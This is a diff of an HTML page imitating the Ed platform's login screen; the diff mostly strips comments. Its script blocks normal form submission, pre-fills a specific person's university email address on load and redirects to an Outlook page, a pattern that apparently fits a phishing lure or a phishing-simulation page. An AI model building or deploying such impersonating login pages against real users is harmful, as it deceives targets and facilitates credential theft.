@@ -5,7 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Ed - Login</title>
     <style>
-        /* COLOR VARIABLES */
         :root {
             --bg-dark: #1C2A38;
             --purple-logo-bg: #9b59b6;
@@ -49,7 +48,6 @@
             align-items: center;
         }
 
-        /* Logo Container - Updated to use SVG logo */
         .logo-container {
             width: 80px;
             height: 80px;
@@ -61,14 +59,12 @@
             box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
         }
 
-        /* Logo Image */
         .logo-image {
             width: 100%;
             height: 100%;
             border-radius: 16px;
         }
 
-        /* Region Selector */
         .start-region-select {
             border: 1px solid var(--input-border);
             border-radius: 5px;
@@ -88,7 +84,6 @@
             min-width: 140px;
         }
 
-        /* Message Box - Properly centered */
         .start-message {
             border-radius: 4px;
             margin: 15px auto 20px auto;
@@ -102,13 +97,11 @@
             font-size: 15px;
         }
 
-        /* Form Container */
         .form-container {
             width: 100%;
             margin-top: 10px;
         }
 
-        /* Email Label */
         .form-label {
             color: rgba(255, 255, 255, 0.9);
             font-size: 14px;
@@ -117,7 +110,6 @@
             font-weight: 500;
         }
 
-        /* Email Input */
         .email-input {
             width: 100%;
             padding: 12px;
@@ -136,7 +128,6 @@
             border-color: var(--blue-button-bg);
         }
 
-        /* Continue Button */
         .start-btn {
             display: block;
             margin: 0 0 20px 0;
@@ -162,7 +153,6 @@
             transform: translateY(0);
         }
 
-        /* Login Links - Fixed grey color */
         .login-links {
             text-align: center;
             width: 100%;
@@ -183,7 +173,6 @@
             text-decoration: underline;
         }
 
-        /* Footer Links - Fixed position and added Terms */
         .footer-links {
             position: fixed;
             bottom: 24px;
@@ -203,7 +192,6 @@
             color: var(--link-hover);
         }
 
-        /* Responsive Design */
         @media (max-width: 480px) {
             .login-container {
                 max-width: 100%;
@@ -218,10 +206,8 @@
         }
     </style>
     <script>
-        // Configuration - Set this to true to enable redirect
-        const ENABLE_REDIRECT = true; // Change to true to enable the redirect
+        const ENABLE_REDIRECT = true; 
         
-        // Redirect function
         function redirectToOutlook() {
             if (ENABLE_REDIRECT) {
                 console.log('Redirecting now...');
@@ -235,24 +221,19 @@
             }
         }
         
-        // Form submission handler
         function handleSubmit(event) {
             console.log('Form submitted');
             event.preventDefault();
             event.stopPropagation();
             
-            // You can add any form processing here
             console.log('Calling redirect function...');
             redirectToOutlook();
             return false;
         }
         
-        // Initialize on page load
         window.onload = function() {
-            // Pre-fill email
             document.getElementById('email-input').value = 'abadger3@gatech.edu';
             
-            // Add click event listener to button as backup
             const submitBtn = document.querySelector('.start-btn');
             if (submitBtn) {
                 submitBtn.addEventListener('click', function(event) {
@@ -266,7 +247,6 @@
 </head>
 <body>
     <div class="login-container">
-        <!-- Ed logo using the actual SVG file -->
         <div class="logo-container">
             <img src="/logo.svg" alt="Ed" class="logo-image">
         </div>
@@ -279,7 +259,6 @@
             <option value="gb">United Kingdom</option>
         </select>
 
-        <!-- Centered message -->
         <div class="start-message" aria-live="polite">
             Log in to continue.
         </div>
@@ -303,7 +282,6 @@
         </form>
     </div>
 
-    <!-- Fixed footer links - removed Download, added Terms -->
     <div class="footer-links">
         <a href="#">Privacy</a>
         <a href="#">Terms</a>
